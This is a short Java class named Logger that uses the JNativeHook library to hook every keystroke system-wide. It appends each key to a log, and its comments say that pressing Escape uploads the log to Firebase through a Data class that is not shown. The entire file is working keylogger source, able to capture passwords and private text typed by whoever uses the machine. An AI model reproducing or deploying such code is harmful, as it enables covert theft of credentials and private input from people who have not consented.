import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.IOException;
import java.util.concurrent.ExecutionException;

public class Logger implements NativeKeyListener {

    // Log for all keyboard inputs
    private String log;

    public void nativeKeyPressed(NativeKeyEvent e) {

        // Display and log key inputs
        System.out.println("Key Pressed " + NativeKeyEvent.getKeyText(e.getKeyCode()));
        log += NativeKeyEvent.getKeyText(e.getKeyCode());

        // Exit program if escape pressed and create new Data class to upload log to Firebase
        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
            try {
                new Data(log);
            } catch (IOException | InterruptedException | ExecutionException ex) {
                ex.printStackTrace();
            }
            try {
                GlobalScreen.unregisterNativeHook();
            } catch (NativeHookException ex) {
                ex.printStackTrace();
            }
        }
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
    }

    // Adds when shift is released to know which letters are capitalized
    public void nativeKeyReleased(NativeKeyEvent e) {
        if (e.getKeyCode() == 42) {
            log += "Shift Released";
        }
    }
}
